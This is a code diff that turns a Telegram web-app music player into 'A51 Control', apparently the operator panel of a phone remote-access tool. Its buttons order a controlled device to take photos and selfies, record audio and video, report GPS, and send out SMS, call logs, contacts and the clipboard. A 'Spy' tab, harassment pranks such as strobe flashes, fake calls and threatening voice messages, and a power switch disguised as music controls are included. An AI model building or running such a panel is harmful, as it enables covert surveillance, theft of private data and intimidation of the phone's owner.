@@ -3,290 +3,430 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>A51 Sound</title>
+<title>A51 Control</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
-body { background: #111; color: #fff; font-family: -apple-system, BlinkMacSystemFont, sans-serif; min-height: 100vh; }
-.header { display: flex; align-items: center; justify-content: space-between; padding: 12px 14px; background: #1a1a1a; position: sticky; top: 0; z-index: 100; border-bottom: 1px solid #2a2a2a; }
-.logo { font-size: 17px; font-weight: 800; letter-spacing: -0.3px; }
-.logo span { color: #ff5500; }
-.hdr-btns { display: flex; gap: 8px; }
-.hdr-btn { background: #2a2a2a; border: none; border-radius: 50%; width: 34px; height: 34px; font-size: 15px; color: #fff; cursor: pointer; display: flex; align-items: center; justify-content: center; }
-.hdr-btn:active { opacity: 0.6; }
-#now-playing { display: none; align-items: center; gap: 10px; padding: 8px 14px; background: #1e1e1e; border-bottom: 1px solid #2a2a2a; }
-#now-playing.show { display: flex; }
-.np-cover { width: 38px; height: 38px; border-radius: 6px; object-fit: cover; flex-shrink: 0; background: #2a2a2a; }
-.np-text { flex: 1; min-width: 0; }
-.np-title { font-size: 13px; font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-.np-artist { font-size: 11px; color: #888; margin-top: 1px; }
-.np-eq { color: #ff5500; font-size: 14px; animation: pulse 1.2s ease-in-out infinite; }
-@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-.np-stop { background: none; border: none; color: #ff5500; font-size: 22px; cursor: pointer; padding: 2px 4px; }
-.search-wrap { padding: 8px 14px; background: #1a1a1a; position: sticky; top: 58px; z-index: 99; border-bottom: 1px solid #2a2a2a; }
-#search { width: 100%; padding: 8px 14px; background: #2a2a2a; border: none; border-radius: 20px; color: #fff; font-size: 14px; outline: none; -webkit-appearance: none; }
-#search::placeholder { color: #555; }
-.tabs { display: flex; background: #1a1a1a; border-bottom: 1px solid #2a2a2a; }
-.tab { flex: 1; padding: 10px 8px; background: none; border: none; color: #666; font-size: 13px; font-weight: 600; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -1px; }
-.tab.on { color: #ff5500; border-bottom-color: #ff5500; }
-#grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 2px; padding: 2px; }
-.tr { position: relative; cursor: pointer; aspect-ratio: 1; overflow: hidden; background: #1e1e1e; }
-.tr:active { opacity: 0.65; transform: scale(0.97); transition: transform 0.1s; }
-.tr.on { outline: 2px solid #ff5500; outline-offset: -2px; }
-.tr-img { width: 100%; height: 100%; object-fit: cover; display: block; }
-.tr-no-img { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 24px; background: #222; }
-.tr-overlay { position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(transparent 0%, rgba(0,0,0,0.82) 100%); padding: 18px 5px 4px; }
-.tr-title { font-size: 9.5px; font-weight: 700; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; line-height: 1.3; }
-.tr-artist { font-size: 8.5px; color: #bbb; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-.tr-play-dot { display: none; position: absolute; top: 4px; left: 4px; width: 14px; height: 14px; background: #ff5500; border-radius: 50%; align-items: center; justify-content: center; font-size: 7px; color: #fff; }
-.tr.on .tr-play-dot { display: flex; }
-/* ── КНОПКА ЛАЙКА ── */
-.tr-like {
-  position: absolute; top: 4px; right: 4px;
-  width: 24px; height: 24px;
-  background: rgba(0,0,0,0.55);
-  border: none; border-radius: 50%;
-  color: #fff; font-size: 13px;
-  cursor: pointer;
-  display: flex; align-items: center; justify-content: center;
-  z-index: 5;
-  padding: 0;
-  transition: transform 0.15s, background 0.15s;
+:root {
+  --bg: #0a0a0a;
+  --card: #171717;
+  --accent: #ff5500;
+  --text: #fff;
+  --muted: #8a8a8a;
 }
-.tr-like:active { transform: scale(0.8); }
-.tr-like.liked { background: #ff3050; color: #fff; }
-#status-block { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 60px 20px; gap: 14px; color: #555; grid-column: 1 / -1; }
-.spin { width: 38px; height: 38px; border: 3px solid #2a2a2a; border-top-color: #ff5500; border-radius: 50%; animation: spin 0.8s linear infinite; }
-@keyframes spin { to { transform: rotate(360deg); } }
-#toast { position: fixed; bottom: 14px; left: 50%; transform: translateX(-50%); background: #2a2a2a; color: #fff; padding: 8px 20px; border-radius: 22px; font-size: 13px; white-space: nowrap; opacity: 0; transition: opacity 0.2s; pointer-events: none; z-index: 9999; max-width: 90vw; }
-#toast.show { opacity: 1; }
-#toast.ok  { background: #27ae60; }
-#toast.err { background: #c0392b; }
+* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, 'SF Pro', system-ui, sans-serif;
+  min-height: 100vh;
+  padding-bottom: 40px;
+}
+.header {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 14px 16px 10px;
+  position: sticky; top: 0;
+  background: var(--bg);
+  z-index: 10;
+}
+.logo { font-size: 20px; font-weight: 800; letter-spacing: -0.5px; }
+.logo span { color: var(--accent); }
+.status { display: flex; align-items: center; gap: 6px; font-size: 12px; color: var(--muted); }
+.dot {
+  width: 8px; height: 8px; border-radius: 50%;
+  background: #2ecc71; box-shadow: 0 0 8px #2ecc71;
+  animation: pulse 2s infinite;
+}
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+
+.tabs {
+  display: flex; gap: 6px;
+  padding: 0 16px 14px;
+  overflow-x: auto; scrollbar-width: none;
+}
+.tabs::-webkit-scrollbar { display: none; }
+.tab {
+  flex: 0 0 auto;
+  padding: 9px 16px;
+  border-radius: 22px;
+  background: var(--card);
+  color: var(--muted);
+  font-size: 12px; font-weight: 600;
+  border: none; cursor: pointer;
+  transition: all 0.2s;
+}
+.tab.active { background: var(--accent); color: #fff; }
+
+.content { padding: 0 16px; }
+.page { display: none; animation: fadeIn 0.25s ease; }
+.page.active { display: block; }
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(6px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.section-title {
+  font-size: 11px; font-weight: 700;
+  letter-spacing: 1.2px; text-transform: uppercase;
+  color: var(--muted); margin: 18px 0 10px;
+}
+.section-title:first-child { margin-top: 0; }
+
+.grid { display: grid; gap: 10px; }
+.g2 { grid-template-columns: 1fr 1fr; }
+.g3 { grid-template-columns: 1fr 1fr 1fr; }
+
+button.action {
+  background: var(--card);
+  color: var(--text);
+  border: none; border-radius: 16px;
+  padding: 16px 10px;
+  font-size: 13px; font-weight: 600;
+  display: flex; flex-direction: column; align-items: center; gap: 6px;
+  cursor: pointer;
+  transition: transform 0.1s, background 0.2s;
+  min-height: 84px;
+  justify-content: center;
+}
+button.action:active { transform: scale(0.95); background: var(--accent); }
+button.action.danger { color: #ff6b6b; }
+button.action.danger:active { background: #ff6b6b; color: #fff; }
+button.action.success { color: #2ecc71; }
+button.action.success:active { background: #2ecc71; color: #fff; }
+button.action.warn { color: #f39c12; }
+button.action.warn:active { background: #f39c12; color: #fff; }
+.icon { font-size: 26px; line-height: 1; }
+.label { font-size: 12px; }
+
+button.action.primary {
+  background: linear-gradient(135deg, var(--accent), #1e88e5);
+  color: #fff;
+  grid-column: span 2;
+  min-height: 60px;
+  flex-direction: row;
+  gap: 10px;
+}
+button.action.primary .icon { font-size: 22px; }
+button.action.primary .label { font-size: 15px; }
+
+/* Большие кнопки Питания */
+button.big {
+  min-height: 110px;
+  font-size: 15px;
+  border-radius: 20px;
+  gap: 10px;
+}
+button.big .icon { font-size: 40px; }
+button.big .label { font-size: 15px; font-weight: 700; }
+
+.input-block { display: flex; gap: 8px; margin-bottom: 10px; }
+.input-block input {
+  flex: 1; padding: 12px 14px;
+  border-radius: 12px; border: 1px solid #222;
+  background: var(--card); color: var(--text);
+  font-size: 14px; outline: none;
+}
+.input-block input::placeholder { color: #555; }
+.input-block button {
+  padding: 12px 20px; border-radius: 12px;
+  background: var(--accent); color: #fff;
+  border: none; font-weight: 600;
+  cursor: pointer; font-size: 16px;
+}
+.input-block button:active { opacity: 0.8; }
+
+.toast {
+  position: fixed; bottom: 30px; left: 50%;
+  transform: translateX(-50%) translateY(100px);
+  background: rgba(0,0,0,0.9);
+  backdrop-filter: blur(10px);
+  color: #fff; padding: 12px 22px;
+  border-radius: 30px;
+  font-size: 14px; font-weight: 600;
+  z-index: 1000; opacity: 0;
+  transition: all 0.3s ease;
+  pointer-events: none;
+  white-space: nowrap;
+  max-width: 90vw; overflow: hidden; text-overflow: ellipsis;
+}
+.toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+.toast.ok { background: rgba(46, 204, 113, 0.95); }
+.toast.err { background: rgba(231, 76, 60, 0.95); }
+
+.warn-box {
+  background: #1e1408;
+  border: 1px solid #f39c12;
+  border-radius: 12px;
+  padding: 12px;
+  margin-top: 20px;
+  font-size: 12px;
+  color: #f39c12;
+  line-height: 1.5;
+}
 </style>
 </head>
 <body>
 
 <div class="header">
-  <div class="logo">A51 <span>Sound</span></div>
-  <div class="hdr-btns">
-    <button class="hdr-btn" onclick="doStop()">⏹</button>
-    <button class="hdr-btn" onclick="doVolume()">🔊</button>
-  </div>
-</div>
-
-<div id="now-playing">
-  <img class="np-cover" id="np-cover" src="" alt="">
-  <div class="np-text">
-    <div class="np-title" id="np-title">—</div>
-    <div class="np-artist" id="np-artist"></div>
-  </div>
-  <span class="np-eq">♫</span>
-  <button class="np-stop" onclick="doStop()">⏹</button>
-</div>
-
-<div class="search-wrap">
-  <input id="search" type="search" placeholder="🔍 Поиск..." oninput="onSearch(this.value)">
+  <div class="logo">A51 <span>Control</span></div>
+  <div class="status"><span class="dot"></span>online</div>
 </div>
 
 <div class="tabs">
-  <button class="tab on" onclick="switchTab('all',this)">🎵 Треки</button>
-  <button class="tab" onclick="switchTab('liked',this)">❤️ Лайки <span id="likeCount"></span></button>
-  <button class="tab" onclick="switchTab('sound',this)">🔊 Звук</button>
+  <button class="tab active" onclick="switchTab('system', this)">⚙️ Система</button>
+  <button class="tab" onclick="switchTab('spy', this)">🕵️ Шпион</button>
+  <button class="tab" onclick="switchTab('prank', this)">🎭 Пранк</button>
+  <button class="tab" onclick="switchTab('music', this)">🎵 Музыка</button>
+  <button class="tab" onclick="switchTab('power', this)">⏻ Питание</button>
 </div>
 
-<div id="grid">
-  <div id="status-block"><div class="spin"></div><div>Загружаем треки...</div></div>
-</div>
+<div class="content">
 
-<div id="sound-panel" style="display:none; padding:16px;">
-  <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
-    <button onclick="quickVol(20)" class="vb">🔈 20%</button>
-    <button onclick="quickVol(50)" class="vb">🔉 50%</button>
-    <button onclick="quickVol(80)" class="vb">🔊 80%</button>
-    <button onclick="quickVol(100)" class="vb">🔊 100%</button>
-    <button onclick="doStop()" style="grid-column:span 2;background:#c0392b;border:none;color:#fff;border-radius:12px;padding:16px;font-size:15px;font-weight:600;cursor:pointer;">⏹ Остановить</button>
+  <!-- SYSTEM -->
+  <div class="page active" id="system">
+    <div class="section-title">Свет и связь</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/torch on')"><span class="icon">🔦</span><span class="label">Фонарь</span></button>
+      <button class="action" onclick="send('/torch off')"><span class="icon">🌑</span><span class="label">Выкл</span></button>
+      <button class="action" onclick="send('/vibrate 3')"><span class="icon">📳</span><span class="label">Вибро</span></button>
+    </div>
+
+    <div class="section-title">Камера и локация</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/photo')"><span class="icon">📸</span><span class="label">Фото</span></button>
+      <button class="action" onclick="send('/selfie')"><span class="icon">🤳</span><span class="label">Селфи</span></button>
+      <button class="action" onclick="send('/location')"><span class="icon">📍</span><span class="label">GPS</span></button>
+    </div>
+
+    <div class="section-title">Серии фото / видео</div>
+    <div class="grid g2">
+      <button class="action" onclick="send('/burst 5')"><span class="icon">📷</span><span class="label">Burst ×5</span></button>
+      <button class="action" onclick="send('/sburst 5')"><span class="icon">🎞</span><span class="label">Селфи ×5</span></button>
+      <button class="action" onclick="send('/video 10')"><span class="icon">🎥</span><span class="label">Видео 10с</span></button>
+      <button class="action" onclick="send('/selfievideo 10')"><span class="icon">🎬</span><span class="label">Селфи-видео</span></button>
+    </div>
+
+    <div class="section-title">Инфо и управление</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/battery')"><span class="icon">🔋</span><span class="label">Батарея</span></button>
+      <button class="action" onclick="send('/device')"><span class="icon">📱</span><span class="label">Инфо</span></button>
+      <button class="action" onclick="send('/clip')"><span class="icon">📋</span><span class="label">Буфер</span></button>
+      <button class="action" onclick="send('/brightness 100')"><span class="icon">💡</span><span class="label">Свет+</span></button>
+      <button class="action" onclick="send('/brightness 10')"><span class="icon">🌙</span><span class="label">Свет−</span></button>
+      <button class="action" onclick="send('/silent')"><span class="icon">🔇</span><span class="label">Без звука</span></button>
+    </div>
+
+    <div class="section-title">Громкость</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/volume 20')"><span class="icon">🔉</span><span class="label">20%</span></button>
+      <button class="action" onclick="send('/volume 50')"><span class="icon">🔊</span><span class="label">50%</span></button>
+      <button class="action" onclick="send('/volume 100')"><span class="icon">🔊</span><span class="label">100%</span></button>
+    </div>
+
+    <div class="section-title">Голос</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/say Привет!')"><span class="icon">👋</span><span class="label">Привет</span></button>
+      <button class="action" onclick="send('/say Я вижу тебя')"><span class="icon">👁</span><span class="label">Вижу</span></button>
+      <button class="action" onclick="send('/say Помогите!')"><span class="icon">🆘</span><span class="label">SOS</span></button>
+    </div>
+
+    <div class="section-title">Своя команда</div>
+    <div class="input-block">
+      <input id="customCmd" placeholder="/say текст или /notify ..." />
+      <button onclick="sendCustom()">📤</button>
+    </div>
   </div>
-</div>
-<style>.vb{background:#2a2a2a;border:none;color:#fff;border-radius:12px;padding:16px;font-size:14px;cursor:pointer;}</style>
 
-<div id="toast"></div>
+  <!-- SPY -->
+  <div class="page" id="spy">
+    <div class="section-title">Данные</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/sms')"><span class="icon">📩</span><span class="label">SMS</span></button>
+      <button class="action" onclick="send('/calls')"><span class="icon">📞</span><span class="label">Звонки</span></button>
+      <button class="action" onclick="send('/contacts')"><span class="icon">👥</span><span class="label">Контакты</span></button>
+    </div>
+
+    <div class="section-title">Запись и сеть</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/record 10')"><span class="icon">🎤</span><span class="label">Запись 10с</span></button>
+      <button class="action" onclick="send('/record 30')"><span class="icon">🎙</span><span class="label">Запись 30с</span></button>
+      <button class="action" onclick="send('/wifi')"><span class="icon">📶</span><span class="label">WiFi</span></button>
+      <button class="action" onclick="send('/wifiscan')"><span class="icon">📡</span><span class="label">Скан сетей</span></button>
+    </div>
+
+    <div class="section-title">Показать на экране</div>
+    <div class="input-block">
+      <input id="toastText" placeholder="Текст всплывашки" />
+      <button onclick="sendInput('/toast ', 'toastText')">🎈</button>
+    </div>
+    <div class="input-block">
+      <input id="notifyText" placeholder="Текст уведомления" />
+      <button onclick="sendInput('/notify ', 'notifyText')">🔔</button>
+    </div>
+
+    <div class="section-title">Открыть ссылку</div>
+    <div class="grid g2">
+      <button class="action" onclick="send('/open https://youtube.com')"><span class="icon">▶️</span><span class="label">YouTube</span></button>
+      <button class="action" onclick="send('/open https://google.com')"><span class="icon">🌐</span><span class="label">Google</span></button>
+    </div>
+  </div>
+
+  <!-- PRANK -->
+  <div class="page" id="prank">
+    <div class="section-title">🎯 Новые эффекты</div>
+    <div class="grid g3">
+      <button class="action warn" onclick="send('/flash 10')"><span class="icon">⚡</span><span class="label">Миг ×10</span></button>
+      <button class="action warn" onclick="send('/flash 30')"><span class="icon">✨</span><span class="label">Миг ×30</span></button>
+      <button class="action warn" onclick="send('/flash 100')"><span class="icon">🌩</span><span class="label">Стробоскоп</span></button>
+      <button class="action warn" onclick="send('/fakecall 15')"><span class="icon">📞</span><span class="label">Звонок 15с</span></button>
+      <button class="action warn" onclick="send('/fakecall 60')"><span class="icon">☎️</span><span class="label">Звонок 60с</span></button>
+      <button class="action warn" onclick="send('/loud')"><span class="icon">🔊</span><span class="label">LOUD</span></button>
+    </div>
+
+    <div class="section-title">Мощные пранки</div>
+    <button class="action warn" style="margin-bottom:10px;" onclick="send('/prank')">
+      <span class="icon">🎭</span><span class="label">Prank — случайный хаос</span>
+    </button>
+    <button class="action warn" style="margin-bottom:10px;" onclick="send('/ghost')">
+      <span class="icon">👻</span><span class="label">Ghost — режим призрака</span>
+    </button>
+    <button class="action warn" style="margin-bottom:10px;" onclick="send('/insane')">
+      <span class="icon">🤪</span><span class="label">Insane — режим безумия</span>
+    </button>
+
+    <div class="section-title">Голосовые приколы</div>
+    <div class="grid g2">
+      <button class="action" onclick="send('/say Я твой телефон. Я живой.')"><span class="icon">🤖</span><span class="label">Я живой</span></button>
+      <button class="action" onclick="send('/say Ха-ха-ха-ха!')"><span class="icon">😈</span><span class="label">Смех</span></button>
+      <button class="action" onclick="send('/say Беги, пока можешь.')"><span class="icon">🏃</span><span class="label">Беги</span></button>
+      <button class="action" onclick="send('/say Помогите, меня похитили!')"><span class="icon">😱</span><span class="label">SOS</span></button>
+    </div>
+
+    <div class="section-title">Быстрые эффекты</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/torch on'); setTimeout(()=>send('/torch off'), 300)"><span class="icon">⚡</span><span class="label">Миг</span></button>
+      <button class="action" onclick="send('/vibrate 10')"><span class="icon">📳</span><span class="label">Вибро 10с</span></button>
+      <button class="action" onclick="send('/say Я тебя вижу.')"><span class="icon">👁</span><span class="label">Вижу</span></button>
+    </div>
+
+    <div class="section-title">Своя команда</div>
+    <div class="input-block">
+      <input id="prankCmd" placeholder="/say текст или /toast ..." />
+      <button onclick="sendInput('', 'prankCmd')">📤</button>
+    </div>
+  </div>
+
+  <!-- MUSIC -->
+  <div class="page" id="music">
+    <div class="section-title">Управление музыкой</div>
+    <div class="grid g3">
+      <button class="action" onclick="send('/list')"><span class="icon">📋</span><span class="label">Список</span></button>
+      <button class="action" onclick="send('/stop')"><span class="icon">⏹</span><span class="label">Стоп</span></button>
+      <button class="action" onclick="send('/volume 50')"><span class="icon">🔊</span><span class="label">50%</span></button>
+      <button class="action" onclick="send('/volume 20')"><span class="icon">🔉</span><span class="label">20%</span></button>
+      <button class="action" onclick="send('/volume 80')"><span class="icon">🔊</span><span class="label">80%</span></button>
+      <button class="action" onclick="send('/volume 100')"><span class="icon">🔊</span><span class="label">100%</span></button>
+    </div>
+
+    <div class="section-title">Играть трек</div>
+    <div class="input-block">
+      <input id="playName" placeholder="имя_трека.mp3" />
+      <button onclick="sendInput('/play ', 'playName')">▶️</button>
+    </div>
+  </div>
+
+  <!-- POWER (новая вкладка с маскировкой) -->
+  <div class="page" id="power">
+    <div class="section-title">⏻ Управление ботом</div>
+    <div class="grid g2">
+      <button class="action big success" onclick="send('/resume')">
+        <span class="icon">▶️</span>
+        <span class="label">Продолжить<br>музыку</span>
+      </button>
+      <button class="action big danger" onclick="send('/pause')">
+        <span class="icon">⏹</span>
+        <span class="label">Выключить<br>музыку</span>
+      </button>
+    </div>
+
+    <div class="warn-box">
+      ⚠️ Внимание: эти кнопки <b>не управляют музыкой</b>. Они включают и выключают <b>бота целиком</b>. После «Выключить музыку» бот перестанет отвечать на все команды. Чтобы вернуть — нажми «Продолжить музыку».
+    </div>
+
+    <div class="section-title">Своя команда</div>
+    <div class="input-block">
+      <input id="powerCmd" placeholder="/resume или /pause" />
+      <button onclick="sendInput('', 'powerCmd')">📤</button>
+    </div>
+  </div>
+
+</div>
+
+<div class="toast" id="toast"></div>
 
 <script>
 const tg = window.Telegram.WebApp;
-tg.ready(); tg.expand();
+tg.ready();
+tg.expand();
+try {
+  tg.setHeaderColor('#0a0a0a');
+  tg.setBackgroundColor('#0a0a0a');
+} catch(e) {}
 
-const LIB_URL = 'https://raw.githack.com/ggfix666-prog/a51-sc-control/main/library.json';
+let lastSent = 0;
 
-let allTracks = [];
-let curTab = 'all';
-let curFile = null;
-let liked = new Set(JSON.parse(localStorage.getItem('sc_liked') || '[]'));
-
-// ── ЗАГРУЗКА ──
-async function loadLib() {
-  try {
-    const r = await fetch(LIB_URL + '?_=' + Date.now());
-    if (!r.ok) throw new Error('HTTP ' + r.status);
-    const data = await r.json();
-    allTracks = data.tracks || [];
-    updateLikeCount();
-    renderGrid(allTracks);
-  } catch(e) {
-    document.getElementById('status-block').innerHTML =
-      `<div style="color:#c0392b">❌ ${e.message}</div>
-       <button onclick="loadLib()" style="background:#ff5500;border:none;color:#fff;padding:10px 24px;border-radius:20px;font-size:14px;cursor:pointer;margin-top:8px">Повторить</button>`;
-  }
+function switchTab(name, el) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById(name).classList.add('active');
+  try { tg.HapticFeedback.selectionChanged(); } catch(e) {}
 }
 
-// ── РЕНДЕР ──
-function renderGrid(tracks) {
-  const g = document.getElementById('grid');
-  if (!tracks.length) {
-    const msg = curTab === 'liked'
-      ? '❤️ Нет лайков.<br><span style="font-size:12px">Нажми на сердечко в углу трека, чтобы добавить.</span>'
-      : '🔍 Ничего не найдено';
-    g.innerHTML = `<div id="status-block"><div style="text-align:center;line-height:1.6">${msg}</div></div>`;
-    return;
-  }
-  g.innerHTML = '';
-  tracks.forEach(t => {
-    const d = document.createElement('div');
-    d.className = 'tr' + (t.file === curFile ? ' on' : '');
-    d.dataset.file = t.file;
-
-    const cover = t.thumb
-      ? `<img class="tr-img" src="${t.thumb}" loading="lazy" decoding="async" alt="">`
-      : `<div class="tr-no-img">🎵</div>`;
-
-    const isLiked = liked.has(t.file);
-    d.innerHTML = `
-      <button class="tr-like ${isLiked ? 'liked' : ''}" onclick="toggleLike(event, '${escapeAttr(t.file)}')">${isLiked ? '❤️' : '🤍'}</button>
-      <div class="tr-play-dot">▶</div>
-      ${cover}
-      <div class="tr-overlay">
-        <div class="tr-title">${esc(t.title || t.file)}</div>
-        ${t.artist ? `<div class="tr-artist">${esc(t.artist)}</div>` : ''}
-      </div>`;
-
-    d.addEventListener('click', (e) => {
-      // если тапнул на кнопку лайка — не запускаем трек
-      if (e.target.classList.contains('tr-like')) return;
-      playTrack(t);
-    });
-    g.appendChild(d);
-  });
+function showToast(text, cls) {
+  const t = document.getElementById('toast');
+  t.textContent = text;
+  t.className = 'toast show' + (cls ? ' ' + cls : '');
+  setTimeout(() => t.classList.remove('show'), 1500);
 }
 
-function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
-function escapeAttr(s) { return String(s).replace(/'/g, "\\'"); }
-
-// ── ЛАЙКИ ──
-function toggleLike(event, file) {
-  event.stopPropagation();
-  event.preventDefault();
-  try { tg.HapticFeedback.impactOccurred('light'); } catch(e) {}
-
-  if (liked.has(file)) {
-    liked.delete(file);
-    toast('Убрано из лайков');
-  } else {
-    liked.add(file);
-    toast('❤️ Добавлено в лайки', 'ok');
-  }
-  localStorage.setItem('sc_liked', JSON.stringify([...liked]));
-  updateLikeCount();
-
-  // Мгновенно обновить кнопку
-  const btn = event.currentTarget;
-  const isLiked = liked.has(file);
-  btn.classList.toggle('liked', isLiked);
-  btn.textContent = isLiked ? '❤️' : '🤍';
-
-  // Если на вкладке «Лайки» — убрать трек из списка
-  if (curTab === 'liked' && !isLiked) {
-    setTimeout(() => renderGrid(getPool()), 200);
-  }
-}
-
-function updateLikeCount() {
-  const el = document.getElementById('likeCount');
-  if (el) el.textContent = liked.size > 0 ? `(${liked.size})` : '';
-}
-
-// ── ПОИСК / ВКЛАДКИ ──
-function onSearch(q) {
-  q = q.toLowerCase().trim();
-  const pool = getPool();
-  renderGrid(q ? pool.filter(t => (t.title||'').toLowerCase().includes(q) || (t.artist||'').toLowerCase().includes(q)) : pool);
-}
-
-function getPool() {
-  if (curTab === 'liked') return allTracks.filter(t => liked.has(t.file));
-  return allTracks;
-}
-
-function switchTab(tab, el) {
-  curTab = tab;
-  document.querySelectorAll('.tab').forEach(b => b.classList.remove('on'));
-  el.classList.add('on');
-  document.getElementById('search').value = '';
-  const grid = document.getElementById('grid');
-  const sound = document.getElementById('sound-panel');
-  if (tab === 'sound') { grid.style.display = 'none'; sound.style.display = 'block'; }
-  else { grid.style.display = 'grid'; sound.style.display = 'none'; renderGrid(getPool()); }
-}
-
-// ── ВОСПРОИЗВЕДЕНИЕ ──
-function playTrack(t) {
-  try { tg.HapticFeedback.impactOccurred('light'); } catch(e) {}
-  send('play_file|' + encodeURIComponent(t.file));
-  curFile = t.file;
-  const np = document.getElementById('now-playing');
-  np.classList.add('show');
-  document.getElementById('np-title').textContent  = t.title || t.file;
-  document.getElementById('np-artist').textContent = t.artist || '';
-  const npCover = document.getElementById('np-cover');
-  if (t.thumb) { npCover.src = t.thumb; npCover.style.display = ''; }
-  else { npCover.style.display = 'none'; }
-  document.querySelectorAll('.tr').forEach(el => el.classList.toggle('on', el.dataset.file === t.file));
-  toast('▶ ' + (t.title || t.file), 'ok');
-}
-
-function doStop() {
+function send(command) {
+  const now = Date.now();
+  if (now - lastSent < 300) return;
+  lastSent = now;
   try { tg.HapticFeedback.impactOccurred('medium'); } catch(e) {}
-  send('stop');
-  curFile = null;
-  document.getElementById('now-playing').classList.remove('show');
-  document.querySelectorAll('.tr.on').forEach(el => el.classList.remove('on'));
-  toast('⏹ Остановлено');
+  showToast('→ ' + command, 'ok');
+  try {
+    tg.sendData(command);
+  } catch(e) {
+    showToast('❌ ' + e.message, 'err');
+  }
 }
 
-function doVolume() {
-  const v = prompt('Громкость (0–100):', '60');
-  if (v === null || v.trim() === '' || isNaN(v)) return;
-  quickVol(parseInt(v));
+function sendCustom() {
+  const val = document.getElementById('customCmd').value.trim();
+  if (!val) return;
+  send(val);
+  document.getElementById('customCmd').value = '';
 }
 
-function quickVol(v) {
-  send('volume|' + v);
-  toast('🔊 ' + v + '%', 'ok');
+function sendInput(prefix, inputId) {
+  const val = document.getElementById(inputId).value.trim();
+  if (!val) return;
+  send(prefix + val);
+  document.getElementById(inputId).value = '';
 }
 
-function send(cmd) {
-  try { tg.sendData(cmd); return true; }
-  catch(e) { toast('❌ ' + e.message, 'err'); return false; }
-}
-
-let _tt;
-function toast(msg, cls) {
-  const el = document.getElementById('toast');
-  el.textContent = msg;
-  el.className = 'show' + (cls ? ' ' + cls : '');
-  clearTimeout(_tt);
-  _tt = setTimeout(() => el.className = '', 2200);
-}
-
-loadLib();
+document.addEventListener('keydown', e => {
+  if (e.key !== 'Enter') return;
+  const id = e.target.id;
+  if (id === 'customCmd') sendCustom();
+  else if (id === 'toastText') sendInput('/toast ', 'toastText');
+  else if (id === 'notifyText') sendInput('/notify ', 'notifyText');
+  else if (id === 'prankCmd') sendInput('', 'prankCmd');
+  else if (id === 'playName') sendInput('/play ', 'playName');
+  else if (id === 'powerCmd') sendInput('', 'powerCmd');
+});
 </script>
+
 </body>
-</html>
+                                                                               </html>
